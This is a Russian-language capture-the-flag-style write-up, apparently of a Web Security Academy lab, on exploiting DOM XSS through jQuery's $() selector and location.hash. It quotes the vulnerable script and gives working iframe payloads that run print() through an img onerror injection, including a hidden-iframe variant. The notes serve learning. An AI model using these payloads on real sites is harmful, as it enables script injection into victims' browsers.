Эта лаборатория содержит уязвимость сценариев на основе DOM на домашней странице. Он использует jQuery's `$()` Селекторная функция в автоматическую прокрутку в данное сообщение, название которого передается через `location.hash` свойство.


## Дано

уязвимость сценариев на домашней странице
функция автоматическая прокрутка сообщения, через `location.hash` свойство.

## Задача

 предоставить жертве эксплойт, который вызовет `print()`функцию в ее браузере


# Разведка

- На главной странице скрипт найден скрипт
![[Pasted image 20250129100820.png]]



```
<script>
    // Обработчик события изменения хэша в URL
    $(window).on('hashchange', function() {
        
        // Получаем текст из хэша, удаляя символ '#'
        var hashText = decodeURIComponent(window.location.hash.slice(1));

        // Ищем заголовок поста, который соответствует тексту из хэша
        var post = $('section.blog-list h2:contains(' + hashText + ')');

        // Если пост найден, прокручиваем страницу к нему        
        if (post) {
            post.get(0).scrollIntoView();
        }
    });
</script>
```
Когда происходит изменения хеша он запускает функции ниже которые ориентируются на заголовки H2 и прокручиваются к ним
`https://0aa900ae036032f68d91d9c800130093.web-security-academy.net/#Black%20Market%20Dealings`

решётка указывает на заголовок H2 которому нас прокручивает

- При неверном имени код не обрабатывает


# Атака

Формируем ссылку с payload 
`/#Say It With Flowers - Or Maybe Not onload="this.src+='<img src="1" onerror=alert(1)>'">`

```
<iframe src="https://0aa900ae036032f68d91d9c800130093.web-security-academy.net/#Black Market Dealings" onload="this.src +='<img src=1 onerror=print()>'">
</iframe>
```

чтоб не видели прогрузку сайта hidden
```
<iframe src="https://0aa900ae036032f68d91d9c800130093.web-security-academy.net/#Black Market Dealings" onload="this.src +='<img src=1 onerror=print()>'" hidden="hidden">
</iframe>
```

- первым загружается изображени в src
- Следом идёт onload так как изображение удачно прогрузилось
- Изменяем src на недействующую картинку и тем самым вызываем onerror
- hidden чтоб спрятать прогрузку iframe

